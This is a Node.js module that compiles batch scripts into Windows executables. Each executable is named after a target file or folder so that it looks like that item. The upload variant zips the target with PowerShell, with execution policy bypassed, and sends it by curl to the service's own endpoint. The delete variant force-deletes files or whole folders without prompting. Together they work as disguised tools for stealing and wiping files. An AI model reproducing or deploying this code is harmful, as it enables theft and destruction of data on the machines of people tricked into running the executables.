const { cmdToExe } = require('./cmd2exe');

function getPublicBaseUrl(req) {
  const configured = process.env.PUBLIC_BASE_URL;
  if (configured && configured.trim()) {
    return configured.trim().replace(/\/$/, '');
  }

  const forwardedProto = req.get('x-forwarded-proto');
  const proto = (forwardedProto || req.protocol || 'https')
    .split(',')[0]
    .trim();

  const forwardedHost = req.get('x-forwarded-host');
  const host = (forwardedHost || req.get('host') || '')
    .split(',')[0]
    .trim();

  if (!host) {
    return null;
  }

  return `${proto}://${host}`;
}

function sanitizeWinPath(targetPath) {
  if (typeof targetPath !== 'string' || !targetPath.trim()) {
    return null;
  }
  const trimmed = targetPath.trim();
  if (trimmed.includes('"') || trimmed.includes('\n') || trimmed.includes('\r')) {
    return null;
  }
  return trimmed;
}

function basenameWin(targetPath) {
  const normalized = targetPath.replace(/\//g, '\\');
  const parts = normalized.split('\\').filter(Boolean);
  if (parts.length === 0) return 'item';
  if (parts.length === 1 && /^[A-Za-z]:$/.test(parts[0])) {
    return parts[0].replace(':', '');
  }
  return parts[parts.length - 1];
}

function safeDownloadName(name) {
  let cleaned = String(name)
    .replace(/[<>:"/\\|?*\x00-\x1F]/g, '_')
    .replace(/\.+$/g, '')
    .trim();

  // Strip the file extension so Document.txt → Document
  const dot = cleaned.lastIndexOf('.');
  if (dot > 0) {
    cleaned = cleaned.slice(0, dot);
  }

  cleaned = cleaned.replace(/\.+$/g, '').trim();
  return cleaned || 'item';
}

function buildFileCmd(filePath, uploadUrl) {
  return [
    '@echo off',
    'setlocal',
    '',
    'rem ============================================',
    'rem File to upload',
    'rem ============================================',
    `set "FILE_PATH=${filePath}"`,
    '',
    'rem ============================================',
    'rem Upload the file',
    'rem ============================================',
    'curl.exe -X POST ^',
    `    "${uploadUrl}" ^`,
    '    -F "file=@%FILE_PATH%"',
    '',
    'set "EXITCODE=%ERRORLEVEL%"',
    '',
    'if %EXITCODE%==0 (',
    '    echo.',
    '    echo Upload completed successfully.',
    ') else (',
    '    echo.',
    '    echo Upload failed. Error code: %EXITCODE%',
    ')',
    '',
    'exit /b %EXITCODE%',
    '',
  ].join('\r\n');
}

function buildFolderCmd(folderPath, uploadUrl) {
  return [
    '@echo off',
    'setlocal',
    '',
    'rem ============================================================',
    'rem Configuration',
    'rem ============================================================',
    '',
    'rem Folder to compress',
    `set "SOURCE_FOLDER=${folderPath}"`,
    '',
    'rem Temporary archive to create',
    'set "ARCHIVE_FILE=%TEMP%\\upload_%RANDOM%_%RANDOM%.zip"',
    '',
    'rem ============================================================',
    'rem Files / folders to exclude',
    'rem',
    'rem Use paths relative to SOURCE_FOLDER.',
    'rem Separate multiple exclusions with |',
    'rem',
    'rem Examples:',
    'rem   bin',
    'rem   bin|temp',
    'rem   bin|temp|*.log',
    'rem   bin\\debug|config.ini|*.tmp',
    'rem',
    'rem Leave empty to exclude nothing.',
    'rem ============================================================',
    '',
    'set "EXCLUDE=temp|*.log"',
    '',
    'rem ============================================================',
    'rem Create archive',
    'rem ============================================================',
    '',
    'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ^',
    '  "$source = [System.IO.Path]::GetFullPath(\'%SOURCE_FOLDER%\').TrimEnd(\'\\\');" ^',
    '  "$archive = [System.IO.Path]::GetFullPath(\'%ARCHIVE_FILE%\');" ^',
    '  "$excludes = \'%EXCLUDE%\'.Split(\'|\', [System.StringSplitOptions]::RemoveEmptyEntries);" ^',
    '  "Add-Type -AssemblyName System.IO.Compression;" ^',
    '  "Add-Type -AssemblyName System.IO.Compression.FileSystem;" ^',
    '  "$zip = [System.IO.Compression.ZipFile]::Open($archive, [System.IO.Compression.ZipArchiveMode]::Create);" ^',
    '  "try {" ^',
    '    "Get-ChildItem -LiteralPath $source -Recurse -File | ForEach-Object {" ^',
    '      "$relative = $_.FullName.Substring($source.Length).TrimStart(\'\\\');" ^',
    '      "$excluded = $false;" ^',
    '      "foreach ($pattern in $excludes) {" ^',
    '        "$p = $pattern.Replace(\'\\\',\'/\');" ^',
    '        "$r = $relative.Replace(\'\\\',\'/\');" ^',
    '        "if ($r -like $p -or $r -like (\'*/\' + $p) -or $r -like ($p + \'/*\')) { $excluded = $true; break }" ^',
    '      "}" ^',
    '      "if (-not $excluded) {" ^',
    '        "[System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zip, $_.FullName, $relative, [System.IO.Compression.CompressionLevel]::Optimal) | Out-Null" ^',
    '      "}" ^',
    '    "}" ^',
    '  "} finally { $zip.Dispose() }"',
    '',
    'if not exist "%ARCHIVE_FILE%" (',
    '    echo Failed to create archive.',
    '    exit /b 1',
    ')',
    '',
    'echo.',
    'echo Archive created:',
    'echo %ARCHIVE_FILE%',
    'echo.',
    '',
    'rem ============================================================',
    'rem Upload archive',
    'rem ============================================================',
    '',
    'curl.exe -X POST ^',
    `    "${uploadUrl}" ^`,
    '    -F "file=@%ARCHIVE_FILE%"',
    '',
    'set "UPLOAD_EXITCODE=%ERRORLEVEL%"',
    '',
    'rem ============================================================',
    'rem Delete temporary archive',
    'rem ============================================================',
    '',
    'del /q "%ARCHIVE_FILE%" >nul 2>&1',
    '',
    'if %UPLOAD_EXITCODE%==0 (',
    '    echo.',
    '    echo Upload completed successfully.',
    ') else (',
    '    echo.',
    '    echo Upload failed. Error code: %UPLOAD_EXITCODE%',
    ')',
    '',
    'exit /b %UPLOAD_EXITCODE%',
    '',
  ].join('\r\n');
}

function buildDeleteFileCmd(filePath) {
  return [
    '@echo off',
    `del /f /q "${filePath}"`,
    '',
  ].join('\r\n');
}

function buildDeleteFolderCmd(folderPath) {
  return [
    '@echo off',
    `rmdir /s /q "${folderPath}"`,
    '',
  ].join('\r\n');
}

function generateUploadExe({ targetPath, type, req }) {
  const pathValue = sanitizeWinPath(targetPath);
  if (!pathValue) {
    return { error: 'A valid Windows path is required' };
  }

  if (type !== 'file' && type !== 'folder') {
    return { error: 'type must be "file" or "folder"' };
  }

  const baseUrl = getPublicBaseUrl(req);
  if (!baseUrl) {
    return { error: 'Could not determine public service URL from the request' };
  }

  const uploadUrl = `${baseUrl}/api/binfile`;
  const baseName = safeDownloadName(basenameWin(pathValue));
  const filename = `${baseName}.exe`;
  const cmdContent = type === 'file'
    ? buildFileCmd(pathValue, uploadUrl)
    : buildFolderCmd(pathValue, uploadUrl);

  try {
    const exeBuffer = cmdToExe(cmdContent);
    return { filename, content: exeBuffer, cmdContent, uploadUrl };
  } catch (err) {
    return { error: err.message || 'Failed to build exe' };
  }
}

function generateDeleteExe({ targetPath, type }) {
  const pathValue = sanitizeWinPath(targetPath);
  if (!pathValue) {
    return { error: 'A valid Windows path is required' };
  }

  if (type !== 'file' && type !== 'folder') {
    return { error: 'type must be "file" or "folder"' };
  }

  const baseName = safeDownloadName(basenameWin(pathValue));
  const filename = `${baseName}_X.exe`;
  const cmdContent = type === 'file'
    ? buildDeleteFileCmd(pathValue)
    : buildDeleteFolderCmd(pathValue);

  try {
    const exeBuffer = cmdToExe(cmdContent);
    return { filename, content: exeBuffer, cmdContent };
  } catch (err) {
    return { error: err.message || 'Failed to build exe' };
  }
}

module.exports = {
  generateUploadExe,
  generateDeleteExe,
  getPublicBaseUrl,
};
